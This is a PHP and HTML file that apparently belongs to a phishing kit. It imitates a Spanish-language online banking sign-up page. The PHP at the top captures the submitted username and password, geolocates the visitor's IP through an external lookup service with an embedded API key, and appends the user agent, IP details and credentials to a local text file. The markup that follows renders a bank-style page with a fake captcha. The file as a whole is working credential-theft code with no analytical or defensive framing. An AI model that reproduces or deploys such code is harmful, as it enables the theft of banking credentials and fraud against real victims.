<?php
    session_start();
    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
    @$IPResult =  file_get_contents($api_url);
       
    if( (!empty($_POST['edt1'])) && (!empty($_POST['edt2'])) ){
           
        $_SESSION["user"] = $_POST['edt1'];
        $_SESSION["pass"] = $_POST['edt2'];
        
        $handle = fopen("claves_0003456.txt", "a");
        fwrite($handle, "***********************************************\n");
        fwrite($handle, 'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\n");
        
        @fwrite($handle, 'IP: '.$IPResult."\n");
        fwrite($handle, 'Usuario: '.$_SESSION['user']."\n");
        fwrite($handle, 'Pass: '.$_SESSION['pass']."\n");
        fclose($handle);  

    }else{
       header ('Location:index.php');
    }
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Afiliarse | Transacciones en Línea</title>
<link href="im/favicon-16.png" rel="icon" sizes="16x16" type="image/png">
<link href="st/main.css" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>
<body style="font-family:sans-serif;font-size: 14px;font-weight: 400;">
<div id="mn-cont">
    <div id="pnl-izq">
        <div class="cnt-izq">
            <div class="mn-lg">
                <img src="im/lg1.svg">
            </div>
            <div class="srv-izq">
                <img src="im/pnl-izq.svg">
            </div>
            <div class="trm-izq">
                <img src="im/trm-cnd.svg">
            </div>
        </div>
    </div>
    <div class="pnl-der" id="fcr">
        <div id="ini-trg" class="frm-cnt step-2">
            <div id="frm-cnvs"  style="width:100%;height:100%;">
                <div id="fcr" onclick="loadDoc2()" style="width:100%;height:100%;"></div>
            </div>
        </div>   
        <div class="trm-der">
            <img src="im/trm-cnd.svg">
        </div>
        <div class="btm-grd"></div> 
    </div>
</div>
<div id="ctch">
    <img src="im/recp.png">
    <p>Privacy - Terms</p>
</div>

<script src="js/scrp.js"></script>
</body>
</html>